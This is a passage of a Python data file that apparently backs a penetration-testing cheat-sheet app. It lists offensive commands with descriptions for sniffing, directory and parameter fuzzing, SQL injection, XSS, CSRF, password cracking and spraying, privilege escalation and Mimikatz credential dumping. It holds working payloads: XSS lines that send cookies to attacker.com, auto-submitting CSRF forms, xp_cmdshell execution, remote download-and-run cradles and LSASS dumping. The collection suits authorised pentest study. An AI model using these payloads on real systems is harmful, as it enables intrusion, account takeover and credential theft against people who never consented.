                     "tags": ["tcpdump","capture","pcap","network"]},
                    {"cmd": "tcpdump -i eth0 host <target_ip> and port 80 -A",
                     "desc": "Capture HTTP traffic to/from a target, print ASCII output for quick review.",
                     "tags": ["tcpdump","http","filter","ascii"]},
                    {"cmd": "tcpdump -r capture.pcap 'tcp[tcpflags] & (tcp-syn) != 0'",
                     "desc": "Read PCAP and filter for SYN packets — see scan attempts in offline analysis.",
                     "tags": ["tcpdump","pcap","read","syn","filter"]},
                    {"cmd": "tcpdump -i eth0 -nn 'port 21 or port 23 or port 110' -A",
                     "desc": "Sniff FTP, Telnet, POP3 — all cleartext protocols. Grab passwords live.",
                     "tags": ["tcpdump","cleartext","ftp","telnet","credentials"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  04. DIRECTORY & FILE BRUTE-FORCING
    # ════════════════════════════════════════════════════════════
    "directory": {
        "title": "Directory & File Brute-Forcing",
        "icon": "📂",
        "description": "Discover hidden paths, files, endpoints, vhosts on web servers",
        "tools": {
            "gobuster": {
                "title": "Gobuster — Multi-Mode Brute-Forcer",
                "about": "Fast concurrent brute-forcer: web dirs, DNS subdomains, virtual hosts, S3 buckets, GCS buckets.",
                "website": "https://github.com/OJ/gobuster",
                "commands": [
                    {"cmd": "gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt",
                     "desc": "Basic directory brute-force with common wordlist. First pass on any web target.",
                     "tags": ["gobuster","directory","brute","web"]},
                    {"cmd": "gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,zip,conf",
                     "desc": "Medium wordlist + extension fuzzing. Finds PHP files, backup files, configs.",
                     "tags": ["gobuster","directory","extensions","php","backup"]},
                    {"cmd": "gobuster dir -u http://<target> -w <wordlist> -t 50 -o dirs.txt -b 404,403",
                     "desc": "50 threads, output to file, ignore 404+403. Balanced speed and noise.",
                     "tags": ["gobuster","threads","output","filter","speed"]},
                    {"cmd": "gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                     "desc": "DNS subdomain brute-force using top 5000 names. Fast subdomain enum.",
                     "tags": ["gobuster","dns","subdomain","enum"]},
                    {"cmd": "gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
                     "desc": "Virtual host discovery via Host header fuzzing. Finds hidden vhosts on shared IPs.",
                     "tags": ["gobuster","vhost","virtual host","discovery"]},
                    {"cmd": "gobuster s3 -w bucket-names.txt",
                     "desc": "Enumerate S3 buckets — finds misconfigured public AWS storage.",
                     "tags": ["gobuster","s3","aws","bucket","cloud"]},
                ],
            },
            "feroxbuster": {
                "title": "Feroxbuster — Recursive Web Brute-Forcer",
                "about": "Rust-powered fast recursive content discovery. Auto-follows directories and recurses.",
                "website": "https://github.com/epi052/feroxbuster",
                "commands": [
                    {"cmd": "feroxbuster -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
                     "desc": "Recursive dir brute-force. Automatically recurses into found directories.",
                     "tags": ["feroxbuster","recursive","directory","brute"]},
                    {"cmd": "feroxbuster -u http://<target> -x php,bak,txt -d 3 -t 100",
                     "desc": "Scan with extensions, depth limit 3, 100 threads. Balance speed vs recursion.",
                     "tags": ["feroxbuster","extensions","depth","threads"]},
                    {"cmd": "feroxbuster -u http://<target> --filter-status 404,403 --silent",
                     "desc": "Filter noise codes, silent mode for piping results to other tools.",
                     "tags": ["feroxbuster","filter","silent","pipe"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  05. FUZZING
    # ════════════════════════════════════════════════════════════
    "fuzzing": {
        "title": "Fuzzing — Parameters, Headers & Inputs",
        "icon": "🎯",
        "description": "Fuzz web parameters, headers, POST data to find hidden functions",
        "tools": {
            "ffuf": {
                "title": "FFUF — Fuzz Faster U Fool",
                "about": "Extremely fast HTTP fuzzer written in Go. FUZZ keyword works anywhere in the request.",
                "website": "https://github.com/ffuf/ffuf",
                "commands": [
                    {"cmd": "ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt",
                     "desc": "Directory fuzzing. Fastest dir discovery tool available.",
                     "tags": ["ffuf","directory","fuzz","fast"]},
                    {"cmd": "ffuf -u http://<target>/FUZZ -w <wordlist> -e .php,.html,.txt,.bak,.zip",
                     "desc": "Append extensions to each wordlist entry. Finds backup files, source code.",
                     "tags": ["ffuf","extensions","backup","php","fuzz"]},
                    {"cmd": "ffuf -u 'http://<target>/page?id=FUZZ' -w numbers.txt -fc 404",
                     "desc": "GET parameter fuzzing — filter 404s. Test for IDOR by iterating IDs.",
                     "tags": ["ffuf","parameter","get","idor","fuzz"]},
                    {"cmd": "ffuf -u http://<target>/login -X POST -d 'user=admin&pass=FUZZ' -w passwords.txt -fc 401",
                     "desc": "POST password brute-force. Filter failed logins (401). Targeted login attack.",
                     "tags": ["ffuf","post","brute","login","password"]},
                    {"cmd": "ffuf -u http://<target> -H 'Host: FUZZ.<domain>' -w subdomains.txt -fs 0",
                     "desc": "VHost discovery via Host header — filter empty responses (size 0).",
                     "tags": ["ffuf","vhost","host","header","subdomain"]},
                    {"cmd": "ffuf -u http://<target>/FUZZ -w <wordlist> -mc 200,301,302 -o results.json -of json",
                     "desc": "Match only success codes, save JSON output for later parsing/automation.",
                     "tags": ["ffuf","filter","json","output","status"]},
                    {"cmd": "ffuf -u http://<target>/FUZZ -w <wordlist> -t 150 -rate 300 -timeout 5",
                     "desc": "Tuned speed: 150 threads, 300 req/s, 5s timeout. Adjust to avoid crashing target.",
                     "tags": ["ffuf","speed","threads","rate","performance"]},
                    {"cmd": "ffuf -u http://<target>/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc all -fc 404",
                     "desc": "API endpoint discovery. Find undocumented API routes using wordlist.",
                     "tags": ["ffuf","api","endpoint","discovery","fuzz"]},
                ],
            },
            "wfuzz": {
                "title": "WFuzz — Web Application Fuzzer",
                "about": "Python-based fuzzer with advanced multi-FUZZ payload support and deep filtering.",
                "website": "https://github.com/xmendez/wfuzz",
                "commands": [
                    {"cmd": "wfuzz -c -w /usr/share/wordlists/dirb/common.txt http://<target>/FUZZ",
                     "desc": "Colourised directory fuzzing with common wordlist.",
                     "tags": ["wfuzz","directory","fuzz","colorize"]},
                    {"cmd": "wfuzz -c -z file,users.txt -z file,passwords.txt --sc 200 -d 'u=FUZZ&p=FUZ2Z' http://<target>/login",
                     "desc": "Dual-wordlist credential brute-force. FUZ2Z = second wordlist payload.",
                     "tags": ["wfuzz","brute","login","multi","payload"]},
                    {"cmd": "wfuzz -c -w <wordlist> --hc 404,403 --hl 0 http://<target>/FUZZ",
                     "desc": "Hide 404, 403, and empty-line responses. Show only interesting hits.",
                     "tags": ["wfuzz","filter","hide","noise","directory"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  06. SQL INJECTION
    # ════════════════════════════════════════════════════════════
    "sqli": {
        "title": "SQL Injection",
        "icon": "💉",
        "description": "Automated & manual SQLi: UNION, error-based, blind, time-based",
        "tools": {
            "sqlmap": {
                "title": "SQLmap — Automated SQL Injection",
                "about": "Detects and exploits SQLi on MySQL, MSSQL, Oracle, PostgreSQL, SQLite, and more.",
                "website": "https://sqlmap.org",
                "commands": [
                    {"cmd": "sqlmap -u 'http://<target>/page?id=1' --dbs",
                     "desc": "Detect SQLi in GET param and enumerate all databases.",
                     "tags": ["sqlmap","sql","injection","databases","enum"]},
                    {"cmd": "sqlmap -u 'http://<target>/page?id=1' -D <db> --tables",
                     "desc": "Enumerate tables in a specific database.",
                     "tags": ["sqlmap","tables","enum"]},
                    {"cmd": "sqlmap -u 'http://<target>/page?id=1' -D <db> -T <table> --dump",
                     "desc": "Dump all rows from a table. Extracts credentials, PII, secrets.",
                     "tags": ["sqlmap","dump","credentials","data"]},
                    {"cmd": "sqlmap -u 'http://<target>' --data='user=a&pass=b' --method POST --dbs",
                     "desc": "Test POST form parameters for SQLi. Use on login forms.",
                     "tags": ["sqlmap","post","login","form"]},
                    {"cmd": "sqlmap -r request.txt --dbs --level=5 --risk=3",
                     "desc": "Load raw Burp request, max detection level and risk. Best technique.",
                     "tags": ["sqlmap","burp","request","level","risk"]},
                    {"cmd": "sqlmap -u '<url>' --cookie='PHPSESSID=abc123' --dbs",
                     "desc": "Test cookie values for injection points. Session cookie SQLi.",
                     "tags": ["sqlmap","cookie","session","injection"]},
                    {"cmd": "sqlmap -u '<url>' --os-shell",
                     "desc": "Get interactive OS shell via SQLi. Requires stacked queries or file write.",
                     "tags": ["sqlmap","shell","rce","os","command"]},
                    {"cmd": "sqlmap -u '<url>' --passwords",
                     "desc": "Extract password hashes from database user table for offline cracking.",
                     "tags": ["sqlmap","passwords","hashes","crack"]},
                    {"cmd": "sqlmap -u '<url>' --technique=BEUSTQ --dbms=mysql --tamper=space2comment",
                     "desc": "Specify techniques + DBMS hint + tamper script (space->comment) to bypass WAF.",
                     "tags": ["sqlmap","tamper","waf bypass","technique","mysql"]},
                    {"cmd": "sqlmap -u '<url>' --file-read=/etc/passwd",
                     "desc": "Read server files via SQLi file_read privilege. Check for sensitive files.",
                     "tags": ["sqlmap","file read","passwd","lfi","privilege"]},
                ],
            },
            "manual_sqli": {
                "title": "Manual SQL Injection Payloads",
                "about": "Hand-crafted payloads for testing and exploiting SQLi without automation.",
                "website": "https://portswigger.net/web-security/sql-injection",
                "commands": [
                    {"cmd": "' OR '1'='1",
                     "desc": "Classic auth bypass. Makes WHERE clause always true. First test on login forms.",
                     "tags": ["sqli","manual","auth bypass","login"]},
                    {"cmd": "' OR 1=1-- -",
                     "desc": "Auth bypass + MySQL/MSSQL comment to strip the rest of the query.",
                     "tags": ["sqli","manual","comment","bypass","mysql"]},
                    {"cmd": "1' ORDER BY 5-- -",
                     "desc": "Column count detection — increment until error. Error at N means N-1 columns.",
                     "tags": ["sqli","manual","union","columns","order by"]},
                    {"cmd": "1' UNION SELECT NULL,NULL,NULL-- -",
                     "desc": "UNION skeleton. Match NULLs to column count, then replace with data expressions.",
                     "tags": ["sqli","manual","union","null"]},
                    {"cmd": "1' UNION SELECT username,password,NULL FROM users-- -",
                     "desc": "Dump credentials via UNION. Column count must match original query.",
                     "tags": ["sqli","manual","union","credentials","dump"]},
                    {"cmd": "1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -",
                     "desc": "Enumerate tables from information_schema. Works on MySQL, PostgreSQL, MSSQL.",
                     "tags": ["sqli","manual","union","information_schema","tables"]},
                    {"cmd": "'; EXEC xp_cmdshell('whoami'); --",
                     "desc": "MSSQL RCE via xp_cmdshell. Requires SA privileges or xp_cmdshell enabled.",
                     "tags": ["sqli","manual","mssql","rce","xp_cmdshell"]},
                ],
            },
            "blind_sqli": {
                "title": "Blind SQL Injection Techniques",
                "about": "Payloads for blind SQLi — boolean-based and time-based where output is invisible.",
                "website": "https://portswigger.net/web-security/sql-injection/blind",
                "commands": [
                    {"cmd": "' AND 1=1-- -  vs  ' AND 1=2-- -",
                     "desc": "Boolean blind confirm — if page differs between TRUE/FALSE, injection point exists.",
                     "tags": ["blind","sqli","boolean","confirm"]},
                    {"cmd": "' AND SLEEP(5)-- -",
                     "desc": "MySQL time-based blind — 5s delay = confirmed. No visible output needed.",
                     "tags": ["blind","sqli","time","mysql","sleep"]},
                    {"cmd": "'; IF (1=1) WAITFOR DELAY '0:0:5'-- -",
                     "desc": "MSSQL time-based blind via WAITFOR DELAY. Confirms injection without output.",
                     "tags": ["blind","sqli","time","mssql","delay","waitfor"]},
                    {"cmd": "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -",
                     "desc": "Binary-search char extraction — compare ASCII values to extract data bit by bit.",
                     "tags": ["blind","sqli","ascii","binary search","extract"]},
                    {"cmd": "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -",
                     "desc": "PostgreSQL time-based blind. Adapt condition to extract data character by character.",
                     "tags": ["blind","sqli","postgresql","time","sleep"]},
                    {"cmd": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
                     "desc": "MySQL sleep via subquery — bypasses WAF signatures that block direct SLEEP().",
                     "tags": ["blind","sqli","time","mysql","sleep","waf bypass"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  07. WEB EXPLOITATION
    # ════════════════════════════════════════════════════════════
    "web_exploit": {
        "title": "Web Exploitation — XSS, CSRF & JS",
        "icon": "💀",
        "description": "XSS payloads, CSRF exploits, DOM-based vulns, JavaScript attacks",
        "tools": {
            "xss": {
                "title": "XSS — Cross-Site Scripting Payloads",
                "about": "Reflected, stored, and DOM-based XSS payloads for testing and demonstrating impact.",
                "website": "https://portswigger.net/web-security/cross-site-scripting",
                "commands": [
                    {"cmd": "<script>alert('XSS')</script>",
                     "desc": "Basic PoC. If alert fires, input is unescaped. First XSS test always.",
                     "tags": ["xss","alert","reflected","poc","test"]},
                    {"cmd": "<img src=x onerror=alert(1)>",
                     "desc": "Image tag XSS — fires on broken image. Bypasses filters blocking <script>.",
                     "tags": ["xss","img","onerror","bypass"]},
                    {"cmd": "<svg onload=alert(document.domain)>",
                     "desc": "SVG onload XSS. Executes immediately. Reveals domain for scope confirmation.",
                     "tags": ["xss","svg","onload","domain","bypass"]},
                    {"cmd": "\"><img src=x onerror=alert(1)>",
                     "desc": "Break out of HTML attribute value then inject. For attribute-context injection.",
                     "tags": ["xss","attribute","breakout","inject"]},
                    {"cmd": "javascript:alert(document.cookie)",
                     "desc": "JavaScript URI in href/src. Fires when victim clicks crafted link.",
                     "tags": ["xss","javascript","href","link","uri"]},
                    {"cmd": "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
                     "desc": "Cookie theft — redirects victim browser sending session cookie to attacker.",
                     "tags": ["xss","cookie","steal","session hijack","stored"]},
                    {"cmd": "<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>",
                     "desc": "Stealthy cookie exfil via Fetch API with base64. Stays on page — no redirect.",
                     "tags": ["xss","cookie","fetch","base64","stealth"]},
                    {"cmd": "<details open ontoggle=alert(1)>",
                     "desc": "HTML5 details tag XSS. Fires automatically on render. Bypasses script/img filters.",
                     "tags": ["xss","html5","details","bypass","toggle"]},
                    {"cmd": "<iframe srcdoc='<script>parent.alert(document.cookie)</script>'>",
                     "desc": "srcdoc iframe XSS — executes JS in iframe context with access to parent.",
                     "tags": ["xss","iframe","srcdoc","bypass"]},
                    {"cmd": "'-alert(1)-'",
                     "desc": "Break out of JavaScript string context. For when input is in a JS variable.",
                     "tags": ["xss","string context","dom","javascript","break"]},
                ],
            },
            "csrf": {
                "title": "CSRF — Cross-Site Request Forgery",
                "about": "Exploit missing CSRF protections to force authenticated users to perform unwanted actions.",
                "website": "https://portswigger.net/web-security/csrf",
                "commands": [
                    {"cmd": "<form action='http://<target>/change-email' method='POST'><input name='email' value='attacker@evil.com'></form><script>document.forms[0].submit()</script>",
                     "desc": "Auto-submit CSRF form. Hosted on attacker site — victim visits, email silently changed.",
                     "tags": ["csrf","form","auto submit","exploit"]},
                    {"cmd": "<img src='http://<target>/delete?confirm=true'>",
                     "desc": "GET-based CSRF via image tag. Fires silently when page loads if action uses GET.",
                     "tags": ["csrf","get","img","silent","delete"]},
                    {"cmd": "fetch('http://<target>/api/change-password',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:'hacked'})})",
                     "desc": "CSRF via Fetch API. credentials:include sends cookies cross-origin. Chain with XSS.",
                     "tags": ["csrf","fetch","api","json","chained","xss"]},
                ],
            },
            "js_vulns": {
                "title": "JavaScript & DOM Vulnerabilities",
                "about": "DOM XSS, prototype pollution, open redirects, PostMessage abuse, client-side auth flaws.",
                "website": "https://portswigger.net/web-security/dom-based",
                "commands": [
                    {"cmd": "location.hash  →  innerHTML / eval()",
                     "desc": "DOM XSS source→sink. If hash fragment flows to innerHTML or eval() — exploitable.",
                     "tags": ["javascript","dom","xss","hash","source","sink"]},
                    {"cmd": "document.write(location.search)",
                     "desc": "Classic DOM XSS sink. Search for this pattern in JS source. Inject: ?<img src=x onerror=alert(1)>",
                     "tags": ["javascript","dom","xss","document.write","sink"]},
                    {"cmd": "Object.prototype.polluted = 'hacked'",
                     "desc": "Prototype pollution test. If affects all objects, serious logic/RCE impact possible.",
                     "tags": ["javascript","prototype pollution","object","test"]},
                    {"cmd": "?url=http://evil.com  or  ?redirect=//evil.com",
                     "desc": "Open redirect test — if app forwards to arbitrary URL, exploitable for phishing.",
                     "tags": ["javascript","open redirect","phishing","url"]},
                    {"cmd": "window.postMessage(JSON.stringify({action:'admin'}), '*')",
                     "desc": "PostMessage XSS — send crafted message to iframe using wildcard origin. Origin not validated = exploitable.",
                     "tags": ["javascript","postmessage","iframe","xss","origin"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  08. PASSWORD ATTACKS
    # ════════════════════════════════════════════════════════════
    "passwords": {
        "title": "Password Attacks & Hash Cracking",
        "icon": "🔑",
        "description": "Offline hash cracking, online brute-force, credential spraying",
        "tools": {
            "hashcat": {
                "title": "Hashcat — GPU Hash Cracker",
                "about": "World's fastest password recovery tool. Supports 350+ hash types with GPU acceleration.",
                "website": "https://hashcat.net",
                "commands": [
                    {"cmd": "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
                     "desc": "MD5 dictionary attack with rockyou. -m 0 = MD5. Core technique, try first.",
                     "tags": ["hashcat","md5","crack","rockyou","dictionary"]},
                    {"cmd": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt",
                     "desc": "NTLM (Windows) hash cracking. Captured from Responder / MITM attacks.",
                     "tags": ["hashcat","ntlm","windows","crack","dictionary"]},
                    {"cmd": "hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt",
                     "desc": "bcrypt cracking. Very slow — GPU barely helps. Use targeted wordlists.",
                     "tags": ["hashcat","bcrypt","crack","slow","wordlist"]},
                    {"cmd": "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt",
                     "desc": "SHA-512crypt (Linux /etc/shadow). Slow — use targeted wordlist + rules.",
                     "tags": ["hashcat","sha512crypt","linux","shadow","crack"]},
                    {"cmd": "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
                     "desc": "Dictionary + best64 rules. Applies 64 transformations per word. Massive hit rate increase.",
                     "tags": ["hashcat","rules","best64","transforms","dictionary"]},
                    {"cmd": "hashcat -m 0 hashes.txt -a 3 '?u?l?l?l?l?l?d?d'",
                     "desc": "Mask (brute-force) attack — pattern: uppercase + 6 lowercase + 2 digits. Fast for known patterns.",
                     "tags": ["hashcat","mask","brute","pattern","chars"]},
                    {"cmd": "hashcat -m 22000 wpa_handshake.hccapx /usr/share/wordlists/rockyou.txt",
                     "desc": "WPA/WPA2 cracking from captured handshake. -m 22000 = WPA2-PBKDF2-PMKID.",
                     "tags": ["hashcat","wpa","wifi","handshake","wireless","crack"]},
                    {"cmd": "hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt",
                     "desc": "Kerberoasting hash cracking (-m 13100 = KRB5TGS). Crack service account tickets.",
                     "tags": ["hashcat","kerberoast","kerberos","active directory","crack"]},
                    {"cmd": "hashcat --show -m 0 hashes.txt",
                     "desc": "Show already-cracked hashes from potfile. No re-cracking needed.",
                     "tags": ["hashcat","show","potfile","cracked","results"]},
                ],
            },
            "john": {
                "title": "John the Ripper — Password Cracker",
                "about": "Classic CPU-based password cracker. Excellent for Linux shadow files and auto-detection.",
                "website": "https://www.openwall.com/john/",
                "commands": [
                    {"cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
                     "desc": "Dictionary attack with rockyou. John auto-detects hash type.",
                     "tags": ["john","crack","wordlist","rockyou","auto-detect"]},
                    {"cmd": "john --format=nt hashes.txt --wordlist=rockyou.txt",
                     "desc": "Force NTLM (NT) format cracking. Use when auto-detect gets it wrong.",
                     "tags": ["john","ntlm","nt","windows","crack"]},
                    {"cmd": "unshadow /etc/passwd /etc/shadow > unshadowed.txt && john unshadowed.txt",
                     "desc": "Combine passwd + shadow files for cracking. Classic Linux privilege escalation follow-up.",
                     "tags": ["john","shadow","passwd","linux","unshadow","crack"]},
                    {"cmd": "john --show hashes.txt",
                     "desc": "Display all cracked passwords from previous session.",
                     "tags": ["john","show","cracked","results"]},
                    {"cmd": "zip2john protected.zip > zip.hash && john zip.hash --wordlist=rockyou.txt",
                     "desc": "Extract ZIP hash and crack the password. Also: pdf2john, rar2john, office2john.",
                     "tags": ["john","zip","pdf","office","crack","file"]},
                ],
            },
            "hydra": {
                "title": "Hydra — Online Password Brute-Forcer",
                "about": "Fast, parallel online login brute-forcer. Supports SSH, FTP, HTTP, RDP, SMB, and 50+ protocols.",
                "website": "https://github.com/vanhauser-thc/thc-hydra",
                "commands": [
                    {"cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target>",
                     "desc": "SSH brute-force with fixed username and rockyou password list.",
                     "tags": ["hydra","ssh","brute","password","online"]},
                    {"cmd": "hydra -L users.txt -P passwords.txt ftp://<target>",
                     "desc": "FTP brute-force with username AND password wordlists.",
                     "tags": ["hydra","ftp","brute","user","password"]},
                    {"cmd": "hydra -l admin -P rockyou.txt http-post-form '/<path>:user=^USER^&pass=^PASS^:F=Invalid'",
                     "desc": "HTTP POST form brute-force. F=fail-string in response. Adapt field names to target.",
                     "tags": ["hydra","http","post","form","brute","web"]},
                    {"cmd": "hydra -l administrator -P rockyou.txt rdp://<target>",
                     "desc": "RDP brute-force. Slow — throttle with -t 4 to avoid lockouts.",
                     "tags": ["hydra","rdp","windows","brute","administrator"]},
                    {"cmd": "hydra -C creds.txt ssh://<target> -t 4",
                     "desc": "Use colon-separated credential file (user:pass format). -t 4 = 4 threads.",
                     "tags": ["hydra","ssh","credentials","file","threads"]},
                    {"cmd": "hydra -l admin -P rockyou.txt smb://<target>",
                     "desc": "SMB brute-force. Follow up with CME for lateral movement if creds found.",
                     "tags": ["hydra","smb","brute","admin","windows"]},
                ],
            },
            "crackmapexec": {
                "title": "CrackMapExec — AD Credential Testing",
                "about": "Swiss army knife for Active Directory pentesting. Credential spraying, lateral movement, exec.",
                "website": "https://github.com/Porchetta-Industries/CrackMapExec",
                "commands": [
                    {"cmd": "crackmapexec smb <target>/24 -u admin -p 'Password123'",
                     "desc": "SMB credential spray across a subnet. Shows PWNED! on successful auth.",
                     "tags": ["cme","crackmapexec","smb","spray","credentials","ad"]},
                    {"cmd": "crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success",
                     "desc": "Credential stuffing — test user:pass combinations, continue even after hit.",
                     "tags": ["cme","smb","spray","stuffing","ad","bulk"]},
                    {"cmd": "crackmapexec smb <target> -u admin -p 'Pass' --sam",
                     "desc": "Dump SAM database hashes remotely. Requires admin credentials.",
                     "tags": ["cme","sam","dump","hashes","admin"]},
                    {"cmd": "crackmapexec smb <target> -u admin -p 'Pass' --lsa",
                     "desc": "Dump LSA secrets — service account creds, cached domain creds, machine hash.",
                     "tags": ["cme","lsa","secrets","dump","credentials"]},
                    {"cmd": "crackmapexec winrm <target> -u admin -p 'Pass' -x 'whoami'",
                     "desc": "Execute command via WinRM. Requires port 5985 and valid creds.",
                     "tags": ["cme","winrm","exec","command","remote"]},
                    {"cmd": "crackmapexec smb <target> -u '' -p '' --shares",
                     "desc": "Enumerate SMB shares with null session (no auth). Finds world-readable shares.",
                     "tags": ["cme","smb","shares","null session","enum"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  09. PRIVILEGE ESCALATION
    # ════════════════════════════════════════════════════════════
    "privesc": {
        "title": "Privilege Escalation",
        "icon": "⬆",
        "description": "Linux & Windows local privilege escalation techniques and enumeration",
        "tools": {
            "linux_privesc": {
                "title": "Linux Privilege Escalation",
                "about": "Manual and tool-assisted Linux PrivEsc: SUID, sudo abuse, cron, writable paths, kernel exploits.",
                "website": "https://gtfobins.github.io",
                "commands": [
                    {"cmd": "id && whoami && uname -a && cat /etc/os-release",
                     "desc": "Basic info dump — current user, kernel version, OS version. Always run first.",
                     "tags": ["linux","privesc","enum","id","kernel"]},
                    {"cmd": "sudo -l",
                     "desc": "List sudo permissions for current user. Check GTFOBins for sudo escape for each binary.",
                     "tags": ["linux","privesc","sudo","gtfobins"]},
                    {"cmd": "find / -perm -u=s -type f 2>/dev/null",
                     "desc": "Find all SUID binaries. Check GTFOBins — many SUID binaries allow root shell.",
                     "tags": ["linux","privesc","suid","find","root"]},
                    {"cmd": "find / -perm -g=s -type f 2>/dev/null",
                     "desc": "Find all SGID binaries. Less common but still exploitable.",
                     "tags": ["linux","privesc","sgid","find"]},
                    {"cmd": "cat /etc/crontab && ls -la /etc/cron*",
                     "desc": "Inspect cron jobs. Writable cron scripts run as root = instant privesc.",
                     "tags": ["linux","privesc","cron","root","writable"]},
                    {"cmd": "find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys",
                     "desc": "Find world-writable files excluding proc/sys. Look for scripts run by root.",
                     "tags": ["linux","privesc","writable","files","root"]},
                    {"cmd": "cat /etc/passwd | grep -v nologin | grep -v false",
                     "desc": "List users with shell access. Identify service accounts with misconfigured shells.",
                     "tags": ["linux","privesc","passwd","users","shell"]},
                    {"cmd": "env | grep -i pass; cat ~/.bash_history; cat ~/.bashrc",
                     "desc": "Check env vars and shell history for plaintext passwords.",
                     "tags": ["linux","privesc","env","history","password","plaintext"]},
                    {"cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                     "desc": "Run LinPEAS — automated Linux privesc enumeration. Most comprehensive tool.",
                     "tags": ["linux","privesc","linpeas","automated","enum"]},
                    {"cmd": "python3 -m http.server 8888",
                     "desc": "Serve LinPEAS/tools via HTTP from attacker machine for victim to download.",
                     "tags": ["linux","http","server","transfer","python"]},
                    {"cmd": "find / -name '*.conf' -o -name '*.config' -o -name '*.xml' 2>/dev/null | xargs grep -l 'password\\|passwd\\|secret' 2>/dev/null",
                     "desc": "Search config files for stored plaintext credentials.",
                     "tags": ["linux","privesc","config","password","credentials","search"]},
                    {"cmd": "ss -tlnp && netstat -tlnp 2>/dev/null",
                     "desc": "List listening services. Find internal services on localhost — pivot targets.",
                     "tags": ["linux","privesc","ports","listening","services","internal"]},
                ],
            },
            "windows_privesc": {
                "title": "Windows Privilege Escalation",
                "about": "Windows PrivEsc: SeImpersonate, Unquoted paths, AlwaysInstallElevated, DLL hijacking.",
                "website": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md",
                "commands": [
                    {"cmd": "whoami /all",
                     "desc": "Full user info: groups, privileges. Check for SeImpersonatePrivilege = Potato attack.",
                     "tags": ["windows","privesc","whoami","privileges","seimpersonate"]},
                    {"cmd": "whoami /priv",
                     "desc": "List token privileges. SeImpersonate, SeAssignPrimaryToken = RottenPotato/JuicyPotato.",
                     "tags": ["windows","privesc","priv","token","potato"]},
                    {"cmd": "systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'System Type'",
                     "desc": "OS version and architecture. Look up kernel exploits for this exact version.",
                     "tags": ["windows","privesc","sysinfo","os","version","kernel"]},
                    {"cmd": "wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows'",
                     "desc": "Find services with unquoted paths outside Windows dir — unquoted service path vuln.",
                     "tags": ["windows","privesc","unquoted path","service","wmic"]},
                    {"cmd": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                     "desc": "Check AlwaysInstallElevated — if 1, any MSI installs as SYSTEM. Generate malicious MSI.",
                     "tags": ["windows","privesc","msi","alwaysinstallelevated","registry"]},
                    {"cmd": "cmdkey /list",
                     "desc": "List stored Windows credentials (cmdkey). Use runas /savecred to abuse them without knowing the password.",
                     "tags": ["windows","privesc","credentials","cmdkey","runas","stored"]},
                    {"cmd": "Get-ChildItem 'C:\\' -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match 'password|pass|cred|secret'}",
                     "desc": "[PowerShell] Search filesystem for files with sensitive names.",
                     "tags": ["windows","privesc","powershell","files","credentials","search"]},
                    {"cmd": "powershell -ep bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://<attacker>/winpeas.ps1\")'",
                     "desc": "Download and run WinPEAS in-memory. Comprehensive automated Windows privesc enum.",
                     "tags": ["windows","privesc","winpeas","automated","enum","powershell"]},
                    {"cmd": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
                     "desc": "Check service permissions for Authenticated Users — find writable service configs.",
                     "tags": ["windows","privesc","service","permission","accesschk"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  10. POST EXPLOITATION
    # ════════════════════════════════════════════════════════════
    "postexploit": {
        "title": "Post Exploitation",
        "icon": "👁",
        "description": "Persistence, lateral movement, credential dumping, AD attacks",
        "tools": {
            "mimikatz": {
                "title": "Mimikatz — Windows Credential Dumper",
                "about": "Extract plaintext passwords, NTLM hashes, Kerberos tickets from Windows memory.",
                "website": "https://github.com/gentilkiwi/mimikatz",
                "commands": [
                    {"cmd": "privilege::debug && sekurlsa::logonpasswords",
                     "desc": "[mimikatz] Enable debug, dump LSASS — extracts all plaintext passwords and hashes.",
                     "tags": ["mimikatz","dump","lsass","passwords","hashes","windows"]},
                    {"cmd": "sekurlsa::wdigest",
                     "desc": "[mimikatz] Dump WDigest plaintext creds (requires wdigest enabled — legacy systems).",
                     "tags": ["mimikatz","wdigest","plaintext","credentials"]},
